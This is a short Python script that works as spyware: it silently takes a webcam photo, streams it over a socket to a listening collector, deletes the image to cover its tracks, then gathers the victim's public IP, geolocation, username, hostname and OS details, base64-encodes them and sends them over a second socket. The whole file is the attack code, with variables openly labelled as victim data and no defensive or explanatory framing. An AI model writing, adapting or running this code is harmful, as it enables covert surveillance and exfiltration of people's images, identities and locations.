import base64
import getpass
import platform
import time
import cv2
import socket
import requests
import os
import json

socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket1.connect(("127.0.0.1", 2001))

socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket2.connect(("127.0.0.1", 2002))

cam = cv2.VideoCapture(0)

while cam.isOpened():
    time.sleep(0.5)
    result, img = cam.read()
    if result:
        cv2.imwrite("H123.jpg", img)
        cv2.destroyAllWindows()
        break

file = open("H123.jpg", "rb")
imgData = file.read(4096)

while imgData:
    socket1.send(imgData)
    imgData = file.read(4096)

file.close()

current_dir = os.getcwd()
os.remove(current_dir+"/H123.jpg")  # for Windows Os --> os.remove(current_dir+"\H123.jpg")

socket1.close()

victimdata = requests.get("http://ip-api.com/json").json()

machinename = socket.gethostname()
username = getpass.getuser()
osname = platform.system()
osversion = platform.version()
osarch = platform.architecture()
osdata = osname+" ver."+osversion
public_ip = victimdata['query']
country = victimdata['country']
regionName = victimdata['regionName']
city = victimdata['city']
lat = victimdata['lat']
lon = victimdata['lon']
timezone = victimdata['timezone']
isp = victimdata['isp']
org = victimdata['org']

payload = {
    "victims_public_ip": public_ip,
    "victims_username": username,
    "victims_machinename": machinename,
    "victims_osdata": osdata,
    "victims_os_arch": osarch,
    "country": country,
    "city": city,
    "lat": lat,
    "lon": lon,
    "isp": isp,
    "org": org
}

print(payload)  # only for testing purposes...
encoded_payload = base64.b64encode(json.dumps(payload).encode())
socket2.send(encoded_payload)
socket2.close()
